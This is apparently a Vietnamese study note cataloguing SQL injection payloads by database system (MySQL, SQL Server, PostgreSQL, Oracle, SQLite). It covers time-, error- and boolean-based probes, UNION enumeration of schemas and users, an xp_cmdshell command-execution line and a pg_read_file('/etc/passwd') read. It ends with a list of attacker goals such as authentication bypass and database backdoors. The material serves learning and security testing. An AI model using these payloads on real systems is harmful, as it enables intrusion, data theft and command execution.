## Người thực hiện: Mai Anh
## Cập nhật: 22/08/2025 
---

1. Các phát hiện đối với mỗi loại db như kiểu SQL server thì có dấu hiệu gì

2. Ngoài thu thập dữ liệu từ db qua SQLi thì còn có thể làm được gì thêm 

# Phát hiện SQL Injection trên các loại CSDL

Mỗi hệ quản trị cơ sở dữ liệu (DBMS) có cú pháp và hàm riêng.  
Dưới đây là một số kỹ thuật phát hiện đặc trưng:

## MySQL
### Kỹ thuật phát hiện
**Time-based**
```sql
' AND SLEEP(5)-- 
' UNION SELECT SLEEP(5)-- 
```
> `SLEEP(5)` làm DB chờ 5 giây trước khi trả kết quả. Nếu web phản hồi chậm 5s → chứng minh SQLi mù (Blind SQLi).

**Error-based**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- 
' AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1)-- 
```
> Lợi dụng hàm XML để tạo lỗi. Trong lỗi hiển thị sẽ có dữ liệu nhúng (phiên bản, tên DB).

**Boolean-based**
```sql
' AND SUBSTRING(VERSION(),1,1)='5'-- 
```
> So sánh ký tự đầu tiên của phiên bản DB. Nếu là MySQL 5.x → điều kiện đúng. Dùng để dò từng ký tự thông tin.

**Information gathering**
```sql
' UNION SELECT VERSION(), DATABASE(), USER()-- 
' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--
```
> Thu thập thông tin cơ bản: phiên bản, DB hiện tại, user, danh sách DB.

---

## SQL Server (MSSQL)
### Dấu hiệu nhận diện
- Error messages chứa "Microsoft OLE DB", "SQLSTATE", hoặc "Microsoft SQL Server"
- Hỗ trợ `@@` variables
- Có thể sử dụng `xp_cmdshell` để thực thi lệnh hệ thống

### Kỹ thuật phát hiện
**Time-based**
```sql
'; WAITFOR DELAY '00:00:05'-- 
' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5)-- 
```
> `WAITFOR DELAY` khiến DB chờ 5s. Nếu web phản hồi chậm → chứng minh SQLi tồn tại.

**Error-based**
```sql
' AND 1=CONVERT(INT, @@VERSION)-- 
' UNION SELECT NULL, NULL WHERE 1=CONVERT(INT, DB_NAME())-- 
```
> Dùng `CONVERT()` với kiểu sai → sinh lỗi và tiết lộ thông tin DB.

**Boolean-based**
```sql
' AND SUBSTRING(@@VERSION,1,1)='M'-- 
```
> So sánh ký tự đầu của phiên bản. Nếu đúng → trang trả bình thường, nếu sai → trang khác biệt.

**Information gathering**
```sql
' UNION SELECT @@VERSION, DB_NAME(), SYSTEM_USER-- 
' UNION SELECT name FROM master..sysdatabases-- 
' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- 
```
> Liệt kê phiên bản, DB, user và bảng/column.

**Command execution (nếu có quyền)**
```sql
'; EXEC xp_cmdshell 'whoami'--
```
> Cho phép thực thi lệnh hệ thống nếu tài khoản DB có quyền.

---

## PostgreSQL
### Dấu hiệu nhận diện
- Error messages chứa "PostgreSQL", "psql", hoặc "pg_"
- Hỗ trợ `::` casting operator
- Case-sensitive string comparisons

### Kỹ thuật phát hiện
**Time-based**
```sql
pg_sleep(5)
```
> `pg_sleep(5)` buộc DB ngủ 5 giây. Dùng trong blind SQLi.

**Error-based**
```sql
CAST((SELECT version()) AS int)
```
> Ép kiểu sai để tạo lỗi, từ đó suy ra DB đang dùng PostgreSQL.

**Boolean-based**
```sql
' AND SUBSTR(VERSION(),1,10)='PostgreSQL'-- 
```
> Kiểm tra chuỗi trả về từ `VERSION()`. Nếu đúng → phản hồi bình thường, nếu sai → khác biệt.

**Information gathering**
```sql
' UNION SELECT VERSION(), CURRENT_DATABASE(), CURRENT_USER-- 
' UNION SELECT schemaname FROM pg_tables-- 
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- 
```
> Lấy thông tin DB hiện tại, user, bảng, cột.

**File operations (nếu có quyền)**
```sql
' UNION SELECT pg_read_file('/etc/passwd')--
```
> Đọc file trên hệ thống nếu DB user có quyền.

---

## Oracle
### Dấu hiệu nhận diện
- Error messages chứa "ORA-", "Oracle", hoặc "OracleDriver"
- Yêu cầu `FROM dual` cho single value queries
- Sử dụng `||` để concatenate strings

### Kỹ thuật phát hiện
**Time-based**
```sql
' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)>0-- 
' UNION SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',5) FROM DUAL-- 
```
> `DBMS_PIPE.RECEIVE_MESSAGE` khiến DB chờ 5s. Nếu phản hồi chậm → chứng minh SQLi.

**Error-based**
```sql
' AND CAST((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1) AS INT)=1-- 
' UNION SELECT TO_CHAR(1/0) FROM DUAL-- 
```
> Lỗi ép kiểu và chia cho 0 sẽ hiển thị thông báo chứa thông tin DB.

**Boolean-based**
```sql
' AND SUBSTR(BANNER,1,6)='Oracle' AND '1'='1'-- 
```
> Kiểm tra chuỗi trong banner để xác nhận DB là Oracle.

**Information gathering**
```sql
' UNION SELECT BANNER, NULL FROM V$VERSION-- 
' UNION SELECT USERNAME, NULL FROM ALL_USERS-- 
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES-- 
```
> Lấy phiên bản, danh sách user và bảng.

---

## SQLite
### Dấu hiệu nhận diện
- Error messages chứa "SQLite", "sqlite3", hoặc "database is locked"
- Không hỗ trợ stored procedures
- Sử dụng `sqlite_master` table

### Kỹ thuật phát hiện
**Time-based (limited options)**
```sql
' AND RANDOM()=RANDOM()-- 
```
> Không có `sleep()`, nhưng có thể tạo truy vấn vô nghĩa để kiểm tra phản hồi.

**Error-based**
```sql
' AND CAST(SQLITE_VERSION() AS INT)=1-- 
```
> Ép kiểu sai từ `SQLITE_VERSION()` để tạo lỗi.

**Boolean-based**
```sql
' AND SUBSTR(SQLITE_VERSION(),1,1)='3'-- 
```
> Kiểm tra ký tự đầu tiên trong phiên bản. Nếu đúng → phản hồi bình thường.

**Information gathering**
```sql
' UNION SELECT SQLITE_VERSION(), NULL-- 
' UNION SELECT sql, name FROM sqlite_master WHERE type='table'-- 
' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
```
> Dò phiên bản và liệt kê bảng từ `sqlite_master`.



# Ứng dụng SQLi ngoài việc thu thập dữ liệu

Ngoài việc lấy dữ liệu nhạy cảm, SQLi còn cho phép kẻ tấn công:

- **Bypass xác thực** → Đăng nhập không cần mật khẩu.  
- **Chèn, sửa hoặc xóa dữ liệu** → Làm thay đổi hoặc mất mát dữ liệu.  
- **Chiếm quyền điều khiển hệ thống** → Kết hợp với lỗ hổng khác để thực thi lệnh hệ điều hành.  
- **Phát hiện cấu trúc database** → Liệt kê bảng, cột, user DB.  
- **Leo thang đặc quyền** → Nếu tài khoản DB có quyền cao, có thể chiếm toàn bộ hệ thống.  
- **Tạo backdoor trong DB** → Cài đặt trigger hoặc stored procedure độc hại để duy trì truy cập.  
